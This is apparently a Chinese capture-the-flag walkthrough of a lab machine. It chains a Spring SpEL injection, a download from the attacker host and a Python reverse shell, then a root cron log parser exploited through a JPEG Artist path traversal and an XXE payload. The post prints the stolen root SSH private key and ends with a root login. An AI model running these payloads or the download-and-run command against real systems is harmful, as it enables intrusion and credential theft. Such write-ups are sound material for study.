只开放了8080端口和22端口

### 端口8080

参考了[Spring Boot漏洞exploit利用方法渗透技巧汇总](https://www.freebuf.com/articles/web/271347.html)

目测是 whitelabel error page SpEL RCE

但是`$`符被禁用了，这坟掘的不错，这里的考点是可以用`*`代替`$`

```python
# coding: utf-8
result = ""
target = 'python3 r444.py'
# wget http://10.10.14.8/reverse/r444.py


for x in target:
    result +=  hex(ord(x)) + ","

print(result.rstrip(','))
```

本地开80端口，让靶机下载，然后执行。

这里分两步，方便排错。之所以是用python3，是因为python失败了，用python3反弹shell成功



搜索框搜索

```java
# wget http://10.10.14.8/reverse/r444.py

*{T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x77,0x67,0x65,0x74,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x31,0x30,0x2e,0x31,0x30,0x2e,0x31,0x34,0x2e,0x38,0x2f,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x2f,0x72,0x34,0x34,0x34,0x2e,0x70,0x79}))}

-------------
    
# python3 r444.py
    
*{T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x70,0x79,0x74,0x68,0x6f,0x6e,0x33,0x20,0x72,0x34,0x34,0x34,0x2e,0x70,0x79}))}
```

## 提权

查看root权限启动

```bash
$ ps -ef|grep root
root           1       0  0 04:59 ?        00:00:05 /sbin/init maybe-ubiquity
root         873       1  0 04:59 ?        00:00:00 /usr/sbin/cron -f
root         875     873  0 04:59 ?        00:00:00 /usr/sbin/CRON -f
root         883     875  0 04:59 ?        00:00:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         884     883  0 04:59 ?        00:00:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar

```

运行pspy发现root权限启动的进程

```
CMD: UID=0    PID=112070 | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```

使用python把文件起出来

```python
$ cd / 
$ python3 -m http.server 9999
```

下载`/opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar`进行分析

使用jd-gui反编译`final-1.0-jar-with-dependencies.jar`获得代码，java能力有限，注释见笑了

```java
package com.logparser;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;
import org.jdom2.Document;
import org.jdom2.Element;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;

public class App {
  public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map<Object, Object> map = new HashMap<>();
    map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
  }
  
  public static boolean isImage(String filename) {
    if (filename.contains(".jpg"))
      return true; 
    return false;
  }
  
  public static String getArtist(String uri) throws IOException, JpegProcessingException {
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for (Directory dir : metadata.getDirectories()) {
      for (Tag tag : dir.getTags()) {
        if (tag.getTagName() == "Artist")
          return tag.getDescription(); 
      } 
    } 
    return "N/A";
  }

  public static void addViewTo(String path, String uri) throws JDOMException, IOException {
    SAXBuilder saxBuilder = new SAXBuilder();
    XMLOutputter xmlOutput = new XMLOutputter();
    xmlOutput.setFormat(Format.getPrettyFormat());
    File fd = new File(path);
    Document doc = saxBuilder.build(fd);
    Element rootElement = doc.getRootElement();
    for (Element el : rootElement.getChildren()) {
      if (el.getName() == "image")
        if (el.getChild("uri").getText().equals(uri)) {
          Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);
          System.out.println("Total views:" + Integer.toString(totalviews.intValue()));
          rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));
          Integer views = Integer.valueOf(Integer.parseInt(el.getChild("views").getText()));
          el.getChild("views").setText(Integer.toString(views.intValue() + 1));
        }  
    } 
    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
    xmlOutput.output(doc, writer);
  }
  
    
// 读取指定文件，如果包含图片，读取uri对应的图片，获得artist属性，然后读取"/credits/" + artist + "_creds.xml"拼接路径的xml文件，执行addViewTo()
  public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
    File log_fd = new File("/opt/panda_search/redpanda.log");
    Scanner log_reader = new Scanner(log_fd);
    while (log_reader.hasNextLine()) {
      String line = log_reader.nextLine();
      if (!isImage(line))
        continue; 
      Map parsed_data = parseLog(line);
      System.out.println(parsed_data.get("uri"));
      String artist = getArtist(parsed_data.get("uri").toString());
      System.out.println("Artist: " + artist);
      String xmlPath = "/credits/" + artist + "_creds.xml";
      addViewTo(xmlPath, parsed_data.get("uri").toString());
    } 
  }
}

```

还可以看到`/credits/woodenk_creds.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>8</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>3</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>2</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>2</views>
  </image>
  <totalviews>15</totalviews>
</credits>
```

构建XXE，而且满足要求

- 目录可可入
- 路径可控，可通过../绕过
- xml文件名要跟图片artist一致
- 等等

在kali上构建文件

### 图片

先找到一张图片

```bash
exiftool -Artist="../tmp/ii"  ii.jpg
```

确认图片信息

```bash
$ exiftool ii.jpg                     
ExifTool Version Number         : 12.44
File Name                       : ii.jpg
Directory                       : .
File Size                       : 842 bytes
File Modification Date/Time     : 2022:08:30 20:20:11-04:00
File Access Date/Time           : 2022:08:30 20:20:11-04:00
File Inode Change Date/Time     : 2022:08:30 20:20:11-04:00
File Permissions                : -rwxrwx---
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 1
Y Resolution                    : 1
Resolution Unit                 : None
Artist                          : ../tmp/ii
Y Cb Cr Positioning             : Centered
Comment                         : Generated by Snipaste
Image Width                     : 66
Image Height                    : 43
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 66x43
Megapixels                      : 0.003

```

构建完图片，下载到靶机/tmp/ii.jpg

构建XXE利用文件，下载到靶机/tmp/ii_creds.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
<credits>
  <author>gg</author>
  <image>
    <uri>/../../../../../../tmp/ii.jpg</uri>
    <views>1</views>
    <foo>&xxe;</foo>
  </image>
  <totalviews>2</totalviews>
</credits>
```

查看`/opt/panda_search/redpanda.log`文件并构建文件，下载到靶机/tmp/log

```bash
200||10.10.14.8||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36||/../../../../../../tmp/ii.jpg

```

```bash
$ cat log >>/opt/panda_search/redpanda.log
```

过了一会，成功读取`/root/.ssh/id_rsa`文件

```
$ cat /tmp/ii_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>ii</author>
  <image>
    <uri>/../../../../../../tmp/ii.jpg</uri>
    <views>2</views>
    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</foo>
  </image>
  <totalviews>3</totalviews>
</credits>

```

复制出来存`id_rsa`然后`chmod 600 id_rsa`

`ssh -i id_rsa root@10.10.11.170` 成功root用户登录